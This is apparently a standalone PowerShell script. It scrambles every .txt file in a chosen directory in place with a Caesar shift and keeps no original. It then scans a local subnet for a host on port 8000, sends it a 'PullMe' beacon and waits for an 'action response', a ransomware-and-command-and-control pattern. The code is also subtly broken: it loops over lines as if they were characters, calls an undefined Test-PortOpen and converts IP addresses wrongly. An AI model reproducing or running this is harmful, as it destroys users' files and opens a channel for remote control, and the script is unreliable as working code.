# Define the directory path
$directoryPath = ""

# Encrypt all txt files in the directory with Caesar cipher (key = 1)
$files = Get-ChildItem -Path $directoryPath -Filter "*.txt" -File
foreach ($file in $files) {
    $content = Get-Content -Path $file.FullName
    $encryptedContent = ""
    foreach ($char in $content) {
        if ($char -ge 'a' -and $char -le 'z') {
            $encryptedChar = [char](([int]$char - 97 + 1) % 26 + 97)
            $encryptedContent += $encryptedChar
        } elseif ($char -ge 'A' -and $char -le 'Z') {
            $encryptedChar = [char](([int]$char - 65 + 1) % 26 + 65)
            $encryptedContent += $encryptedChar
        } else {
            $encryptedContent += $char
        }
    }
    $encryptedContent | Set-Content -Path $file.FullName
}

# Function to send the "PullMe" message and receive the action response
function Send-PullMessage {
    param (
        [string]$ip,
        [int]$port
    )
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    try {
        $tcpClient.Connect($ip, $port)
        $stream = $tcpClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)

        # Send the "PullMe" message to the host
        $message = "PullMe"
        $writer.WriteLine($message)
        $writer.Flush()

        # Set a timeout for receiving the action response (1 minute)
        $stream.ReadTimeout = 60000

        # Receive the action response from the host
        $reader = New-Object System.IO.StreamReader($stream)
        $response = $reader.ReadLine()

        $reader.Close()
        $writer.Close()
        $stream.Close()
        $tcpClient.Close()

        return $response
    } catch {
        $tcpClient.Close()
        return $null
    }
}

# Specify the IP range to check
$ipRange = "192.168.0.1-192.168.0.255"

# Split the IP range into start and end IP addresses
$startIP, $endIP = $ipRange -split "-"

# Convert the start and end IP addresses to integers
$startIPInt = [System.Net.IPAddress]::Parse($startIP).GetAddressBytes() -as [int]
$endIPInt = [System.Net.IPAddress]::Parse($endIP).GetAddressBytes() -as [int]

# Iterate through the IP range and send the "PullMe" message to the first available host
foreach ($ipInt in $startIPInt..$endIPInt) {
    $ip = [System.Net.IPAddress]::Parse($ipInt)
    if (Test-PortOpen $ip 8000) {
        Write-Host "Sending 'PullMe' message to IP address: $ip"
        $response = Send-PullMessage $ip.ToString() 8000
        if ($response) {
            # Perform actions with the received response
            Write-Host "Received action response from ${ip}: $response"
            break  # Exit the loop after receiving the response
        } else {
            Write-Host "No action response received from $ip"
            Start-Sleep -Seconds 60  # Wait for 1 minute before moving to the next IP
        }
    }
}

